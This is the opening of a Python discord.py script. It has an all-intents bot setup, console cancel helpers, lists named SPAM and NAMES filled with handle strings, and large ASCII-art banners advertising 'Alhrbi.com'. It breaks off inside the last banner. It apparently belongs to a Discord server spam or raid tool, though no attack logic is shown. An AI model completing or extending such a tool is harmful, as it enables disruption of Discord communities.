import discord
from discord.ext import commands
import asyncio
import os
import random
import re
import time
import sys
from colorama import init, Fore

init(autoreset=True)
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
RED = Fore.RED

intents = discord.Intents.all()
bot = None
cancel = False

def check_cancel():
    global cancel
    return cancel

def reset_cancel():
    global cancel
    cancel = False

async def wait_cancel():
    global cancel
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, input, YELLOW + "\n[!] Press ENTER to cancel: ")
    cancel = True

SPAM = ["Alhrbi", ".alhrbi", "rayan", "MaybeRayan"]
NAMES = ["Alhrbi", ".alhrbi", "rayan", "MaybeRayan"]

def clean(text):
    return re.sub(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])', '', text)

def printc(text, color=YELLOW):
    print(color + text)

def inp(prompt):
    return input(YELLOW + prompt)

LOGO_MAIN = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣟⣳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⣹⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⡔⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠒⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⡍⠀⢙⢅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠅⠀⠀⠘⠆⠀⢀⡄⢰⣮⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⢺⡃⢀⡀⠀⠀⠀⠀⢀⠀⠤⠄⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠚⡄⣃⣰⡟⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣄⠀⡄⠀⠀⠀⠘⡅⣴⠂⢀⠠⡰⠘⡁⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⣀⢸⣧⠀⠀⠀⠈⢾⣼⠏⠀⣿⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠈⢆⡁⠀⠀⠀⠤⡷⠠⠂⣁⠤⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⠄⠀⠀⠀⢸⡩⠀⢀⣿⠀⠸⣆⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠘⠕⠀⠀⠀⢀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣧⠁⠀⠀⠀⠼⡁⠌⡜⢸⢉⣳⠏⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣢⠀⠁⡄⠀⠘⠀⠀⠀⠠⣻⠀⠀⢀⢀⡠⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⠘⡾⡴⠊⣮⠓⢀⣟⠑⠄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⡔⠼⠁⢆⠀⡸⠀⠀⠀⠀⠀⠁⣯⠀⠀⡊⠂⠀⠀⠀⠀⠀⠀⣀⠤⡠⢤⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠁⠀⠘⡶⡃⠀⢌⡧⠐⠠⢘⢂⠀⠀⠀
⠀⠀⠀⠀⠀⣠⠚⢳⠀⠁⡄⠀⠑⢄⠀⠀⠀⠀⠀⡀⡇⠀⠀⢀⣄⡀⠀⠀⡠⠐⠈⣊⡉⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⣿⠄⠀⠀⠀⠀⠀⢰⠇⠀⠀⢫⠀⠱⡀⣦⣧⠠⡀⠀
⠀⠀⠀⠠⠚⠃⠈⠘⡠⠂⠘⡀⠀⢾⠀⠀⠀⠀⠀⣸⠃⠀⠀⣞⠉⠪⡍⠊⠠⢀⡀⠀⠀⠀⠀⠀⠀⠀⠂⠤⡀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠡⢐⣜⠊⠈⠉⢱⠏⡏⠀⠈⠀
⠀⠀⠀⠀⠀⠀⢘⠀⢊⢦⡶⠙⠄⠀⠀⠀⠀⠀⠰⡘⠀⠀⠀⢻⡆⠂⠘⢶⠀⠂⠈⠑⠀⠶⢓⠀⠀⠤⢀⣀⠀⠁⠦⠡⡄⢳⠄⠀⠀⠀⠀⠀⠀⠁⠑⡱⡀⣸⠟⠀⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠮⠀⠀⠢⣕⠀⠀⠀⠀⠀⠀⠀⣰⠇⠀⠀⢀⠸⡇⠀⡼⠐⠹⣄⠀⠀⠀⠀⠀⠙⠒⢆⠔⠀⠀⠂⣐⡀⢥⠒⠥⠤⠀⠀⠀⠀⠀⠀⠀⢀⣿⡛⠀⠀⣇⢠⠀⠀
⠀⠀⠀⠀⠀⡄⣸⣇⠀⣀⢼⡀⠀⠀⠀⠀⠀⡠⢣⠴⢲⡬⣥⣒⢣⠠⠁⢠⣒⣈⠳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠒⠀⠈⢦⡀⠀⠀⠀⠀⠀⠀⢨⡟⠡⠀⢀⡟⠘⢁⠀
⠀⠀⠀⠀⠠⡡⢫⣽⠞⠀⠀⠑⠢⠄⠀⢀⡼⠉⣡⠖⠁⠀⠀⠘⢺⣤⠞⠉⠀⠀⠙⢻⣦⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⢮⢦⣭⡉⠁⠀⢋⢵⡦⣌⣾⠁⠇⠀⠀
⠀⠀⠀⠀⡘⠀⢸⠋⠀⡀⠄⠀⠀⠀⡡⠋⣠⠞⠁⠀⠀⠀⠀⠰⢌⠀⠀⠀⠀⠀⠀⠀⠀⢷⡊⠰⠄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠈⠻⣷⠬⠙⡅⠀⠀⠀⠈⢼⣽⣧⡇⠀⠀
⠀⠀⢀⠌⠀⠀⠘⡇⠁⠠⠀⠀⣠⠞⠁⠞⠁⠀⠀⠀⢀⣔⠮⠷⠁⠀⡀⠡⡀⠀⠀⠀⠀⠀⠡⡄⠀⠀⠀⠀⠢⠀⠀⠀⠀⠀⠀⠈⠀⠀⠈⠿⢄⠀⠈⠀⠀⠀⠀⠈⣷⢫⠀⠀
⠀⠀⣢⡀⠀⠀⠀⢻⢇⣀⣂⡜⣡⠀⠀⠀⠀⠀⠀⠀⠈⠄⠀⠀⠀⠀⠑⡀⠹⡄⠀⠀⠀⠀⠀⠌⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠂⠐⠒⠓⠺⢷⣦⡶⠖⠒⠀⢻⢻⠀⡄⠀
⠄⠞⢃⠃⠀⠀⠄⠀⢩⢗⣉⠖⠁⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⡀⡈⢆⠀⠀⠀⠀⠀⠈⡗⠄⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣷⠻⠶⡐⡺⠟⠀⠁⠂⠀
⠀⠀⢸⢠⡀⣶⠶⠞⠃⠁⠁⠀⠀⠀⠀⠀⠀⡀⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡰⠀⠡⡀⡄⠀⠀⠀⠘⡄⠈⠰⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⣿⣠⠀⠀⣀⠀⡀⠀⠠⠀
⠀⠀⠀⠎⠀⠈⣦⡤⣄⡀⠀⠀⠀⠀⢀⢆⣤⠗⠡⡠⠄⣀⠀⠀⠀⠀⠀⠀⠀⠈⡳⠀⠘⣸⣄⠀⠀⠈⠜⡄⠀⠀⠈⠠⡠⠀⠤⠀⠀⠀⠀⠀⠀⠘⣮⣇⣤⡴⣶⣿⣝⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⢳⣲⠩⡳⢤⣤⣾⠯⠊⢁⣀⣀⣒⣐⡒⣢⢄⠡⠀⠀⠀⠀⠀⠈⠳⠀⠘⡇⠢⠠⠈⠂⣻⡔⣁⡀⡀⠀⢠⠀⠀⠀⠀⠀⠀⠀⢠⣷⣿⠟⡟⡟⣫⣽⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢷⠁⠈⠺⡇⠀⠐⢄⠀⠀⠘⢧⣉⣀⠜⠀⠀⠑⠀⠀⠀⠀⠀⠀⠑⣄⠰⠀⠙⠪⡄⠻⣇⠀⠅⠙⠛⢉⡿⡍⠀⠒⢒⠄⠀⡾⣿⢹⢈⣿⣿⢊⡞⡍⠆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣧⡐⢳⣥⠀⠀⠀⠈⠀⠺⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠣⡧⠀⠀⠈⠓⠼⣷⣔⡈⠩⠁⠀⠵⡄⠊⠀⠀⢸⣇⡏⣿⣾⠏⢘⠆⡽⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠁⠈⡽⡆⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⢄⠀⠀⠀⠀⠉⠻⠓⢤⢀⣀⡀⣧⠀⠀⢰⣜⢻⡇⢻⣿⠀⠸⠄⣱⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠉⣷⠀⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣺⢸⢀⢰⣿⣾⠀⠘⡇⠀⠀⡑⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⠹⣜⣄⣻⡇⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⢸⣾⡟⡸⢀⣶⠃⠀⠀⠃⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⢾⢉⣯⣄⢷⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣷⢻⡆⣿⣶⣷⣯⠏⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⠟⠁⣹⠇⣯⡏⠎⣦⠀⠀⠀⠈⢧⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠑⢸⣷⣿⣽⡍⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣝⢸⠜⡯⣁⠋⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⠀⢸⣿⠛⣿⣗⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡌⠈⢸⢮⡇⣮⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⢀⣾⡋⢨⣯⠿⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠙⠀⢣⠃⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⣾⢻⣶⡜⡏⠀⠻⣣⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠄⠀⢈⡷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠂⣷⠓⣶⡗⠀⠀⠈⠒⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠈⠀⠘⢆⡀⠀⠀⠀⠀⣀⣀⠀⡀⣀⡀⡀⡀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢀⡰⠉⡄⢀⡻⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠑⢄⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⣠⠊⠀⠀⣇⡼⠁⠀⠀⠘⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠈⠛⠋⠃⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⢽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠈⠳⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠚⠁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢀⡀⠀⠀⠀⠀⠀⠀⠀⠛⢦⡀⠀⠀⠀⠀⠀⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡜⠲⢶⣬⣵⣒⠀⠠⠄⢀⣀⡙⠢⢀⣀⡤⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢗⡚⠋⠐⠂⠈⠡⠙⣛⠭⠵⠂⠌⡱⣦⣤⣄⠘⡀⠠⣶⣖⡶⠦⠴⠯⠭⠽⠟⠛⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠐⠂⠤⠀⠄⣃⣀⣁⢈⣽⡾⠛⢛⣳⣦⠈⠀⡀⢀⠀⢀⠠⠀⠀⠀⠀⠀⠘⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠈⢩⡇⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⠤⡤⠤⠿⠁⠀Alhrbi.com
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠇⠀  githun.com/5cxx
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

DRAGON = r"""
⢀⡀⠤⠤⠠⡖⠲⣄⣀
⡠⠶⣴⣶⣄⠀⢀⣴⣞⣼⣴⣖⣶⣾⡷⣶⣿⣿⣷⢦⡀
⢸⠀⠙⢟⠛⠴⣶⣿⣿⠟⠙⣍⠑⢌⠙⢵⣝⢿⣽⡮⣎⢿⡦⡀
⢸⠀⠀⠀⢱⡶⣋⠿⣽⣸⡀⠘⣎⢢⡰⣷⢿⣣⠹⣿⢸⣿⢿⠿⡦⣄
⢸⠀⠀⠀⢧⡿⣇⡅⣿⣇⠗⢤⣸⣿⢳⣹⡀⠳⣷⣻⣼⢿⣯⡷⣿⣁⠒⠠⢄⡀⠁
⠈⠀⠀⠀⣼⣿⣧⡏⣿⣿⢾⣯⡠⣾⣸⣿⡿⣦⣙⣿⢹⡇⣿⣷⣝⠿⣅⣂⡀⠡⢂⠄⣀
⠇⠀⠀⣿⡟⣿⡇⡏⣿⣽⣿⣧⢻⡗⡇⣇⣤⣿⣿⣿⣧⣿⣿⡲⣭⣀⡭⠛⠁⣨⠁⠉⣂⢄
⠸⠀⠀⢻⣿⣇⣥⣏⣘⣿⣏⠛⠻⣷⠿⡻⡛⠷⡽⡿⣿⣿⣿⣷⠟⠓⠉⠢⢄⡀⢠⠇⠀⠁⠫⢢
⢇⠀⢸⣾⣿⣽⣿⣏⣻⠻⠁⢠⠁⠀⠘⣰⣿⣿⢟⢹⢻⠀⠀⠀⠈⠒⢄⡀⠀⠀⠀⠑⢄
⡄⠀⢸⣯⣿⣿⣿⢷⡀⠀⠀⠀⠀⠀⠛⣩⣿⣿⢿⣾⣸⠀⠀⠀⠀⠀⡤⡞⠉⠉⠁⠀⢀⠌
⢡⠀⢟⣿⣯⡟⠿⡟⢇⡀⠀⠀⠐⠁⢀⢴⠋⡼⢣⣿⣻⡏⠀⠠⣀⣠⠴⠛⠁⠀⠀⢀⡤⠂
⠇⠀⠈⠊⢻⣿⣜⡹⡀⠈⠱⠂⠤⠔⠡⢶⣽⡷⢟⡿⠕⠛⠉⠉⠁⠀⠀⠀⠀⡠⠐⠁
⡄⠀⠀⢿⠿⠿⢿⠾⣽⡀⠀⠀⠀⠈⠻⣥⣃⠀⠀⠀⠀⠀⠀⣀⠤⠒⠁
⠰⡀⡀⠀⠀⠀⠀⠀⠈⠻⣖⠂⠀⠀⠀⠙⠳⣤⣠⠀⣀⠤⠒⠉
⠘⠵⡐⠄⠀⠀⠀⠀⠀⠈⢷⣄⡀⠀⠠⡀⠈⠙⠶⣖⡉⡄
⠈⡥⠈⠂⠀⠀⠀⠀⠀⣼⣿⡿⣶⣄⠈⠣⡀⠀⠈⣿⣧⣄
⠘⡄⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣷⡄⠈⠄⠀⠰⠁⢿⣿⣷⣄
⠘⡄⠀⠀⠀⢠⣿⣿⣯⣿⣿⣿⣿⣿⡄⢸⢀⠃⠀⢸⣿⣿⣽⣧
⠘⡄⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⢥⠀⠀⣽⣿⣿⣿⡿
⢰⣀⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢀⣼⣿⣿⣿⡿⠃
⡀⠸⠉⠃⠁⠈⠉⠙⠛⠿⠿⠽⠿⠟⠛⠉⠛⡲⣿⣿⠿⡿⠟⠁
⣀⠤⠒⠈⠉⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢠⡏⠁
⠁⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⣠⡟
⠀⠀⠀⠀⠀⡰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢔⠏⠀⠀⠀⠄
⠀⠀⠀⢀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⡀⠀⠀⠄⠀⠐⠁
⠀⡠⠒⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠠
⢀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⣃⠀⠀⠀⠀⠀⠀⠀⠂
⡠⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢫⡄⠀⠀⠀⠀⠀⠂
⣰⡿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣸⣧⡂⠀⠀⠀⡀
⣼⠏⣸⣿⣷⢷⠙⣻⢶⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠉⣿⣆
⠰⣏⠀⣿⣿⡘⣼⡇⠀⠁⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠁⠀⣽⣿⡇
⢙⠓⠛⠘⣧⠾⢷⣄⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⣿⢟⢇⠂
⠸⠀⠀⠀⢸⣧⠀⠹⣆⠀⠀⠀⠀⠈⢻⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⣿⢂⠙⢿⡷⣧⡀
⢃⠀⠀⠈⠙⠀⠀⠻⡄⠀⠀⠀⠀⠸⡀⠹⠀⠀⠀⠀⠀⠀⠀⠀⡾⠐⠠⠻⠬⠄⡒
⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⡇
⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⢠⠁
⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠀⠀⠀⠀⠀⠀⠀⡈
⠑⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡀⠀⠀⠀⠀⠀⢀⠃
"""

FACE = r"""
⢀⣠⣤⣤⣤⣄⡀
⣴⣿⣿⣿⣿⣿⣿⣿⣷⡀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿
⠈⢿⣿⣿⣿⣿⣿⣿⣿⡿⠃
⠉⠻⠿⠿⠿⠟⠋
⢀⣴⣶⣿⣿⣶⣄
⢰⣿⣿⣿⣿⣿⣿⣿⣷
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀
⣸⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧
⢠⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⢿⣿⣿⣿⣷⡀
⣼⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠈⠻⣿⣿⣿⣿⣆
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣀⣤⣶⣶⣌⠻⣿⣿⣿⣷⡄
⠹⣿⣿⣿⣿⣿⣿⣿⠁⣰⣿⣿⣿⣿⣿⣦⣙⢿⣿⣿⣿⠄
⢿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣦⣹⣟⣫⣼
⢸⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⢻⣿⣿⣿⣿⣿⡇⠀⠀⠈⠉⠉⢻
⣠⣴⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣶⣿⣿⣿⣿⣿⡇
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇
⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁
"""

BYE = r"""
▬▬▬.◙.▬▬▬
═▂▄▄▓▄▄▂
◢◤ █▀▀████▄▄▄◢◤
█▄ █ █▄ ███▀▀▀▀▀▀╬
◥█████◤
══╩══╩═
╬═╬
╬═╬
╬═╬    Just dropped down to say
╬═╬    *Bye bye*
╬═╬
╬═╬☻/
╬═╬/▌
╬═╬/  \
"""

ALHRBI_ART = r"""
⠀⢀⢺⣿⣿⣿⣿⣿⣦⡈⠻⣿⣿⣿⣿⣿⣿⡇⠀⡀⢀⠠⢀⠠⠀⠄⠠⠀⠄⡀⠄⢠⠀⡄⢠⠀⡄⢠⠀⠤⡀⠤⠠⠄⠤⠠⠄⠤⡐⢠⠐⡄⠢⢄⠢⡐⡄⢆⠄⠀⠀⠀⠀⠀⢄⠢⡄⢤⠠⠄⠄⠀⠀⠀⠀⠀⠂⠠⠐⡤⢐⠲⡘⢤⢂⡔⣠⢂⡔⢠⢂⡔⢠⢂⠔⡠⢂⡔⡠⠄⡢⢄⡰⠠⠄⠤⡐⠠⠄⠤⡀⠤⠠⠄⠤⠠⠄⠤⡀⠀
